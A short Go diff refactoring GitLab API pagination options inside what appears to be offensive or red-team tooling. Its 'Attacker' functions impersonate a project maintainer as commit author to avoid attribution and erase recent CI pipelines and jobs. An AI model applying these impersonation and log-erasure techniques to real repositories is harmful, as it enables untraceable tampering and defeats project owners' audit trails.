@@ -108,7 +108,7 @@ func (a *Attacker) SetupUser(ctx context.Context) (*gitlab.User, error) {
 // ImpersonateMaintainer looks up a project maintainer/owner and sets the
 // author identity to theirs. Makes commits harder to attribute to the attacker.
 func (a *Attacker) ImpersonateMaintainer(ctx context.Context, projectID any) error {
-	opts := &gitlab.ListProjectMembersOptions{ListOptions: gitlab.ListOptions{PerPage: 50, Page: 1}}
+	opts := &gitlab.ListProjectMembersOptions{PerPage: 50, Page: 1}
 	members, _, err := a.Client.GL.ProjectMembers.ListAllProjectMembers(projectID, opts, gitlab.WithContext(ctx))
 	if err != nil {
 		return fmt.Errorf("list project members: %w", err)
@@ -257,9 +257,9 @@ func (a *Attacker) EraseRecentPipelines(ctx context.Context, projectID any, ref 
 		maxPipelines = 5
 	}
 	opts := &gitlab.ListProjectPipelinesOptions{
-		ListOptions: gitlab.ListOptions{Page: 1, PerPage: int64(maxPipelines)},
-		OrderBy:     new("id"),
-		Sort:        new("desc"),
+		Page: 1, PerPage: int64(maxPipelines),
+		OrderBy: new("id"),
+		Sort:    new("desc"),
 	}
 	if ref != "" {
 		opts.Ref = new(ref)
@@ -272,7 +272,7 @@ func (a *Attacker) EraseRecentPipelines(ctx context.Context, projectID any, ref 
 	var cleanupErrs []error
 	for _, pipeline := range pipelines {
 		jobs, _, jobsErr := a.Client.GL.Jobs.ListPipelineJobs(projectID, pipeline.ID, &gitlab.ListJobsOptions{
-			ListOptions: gitlab.ListOptions{PerPage: 100},
+			PerPage: 100,
 		}, gitlab.WithContext(ctx))
 		if jobsErr != nil {
 			cleanupErrs = append(cleanupErrs, fmt.Errorf("pipeline %d list jobs: %w", pipeline.ID, jobsErr))
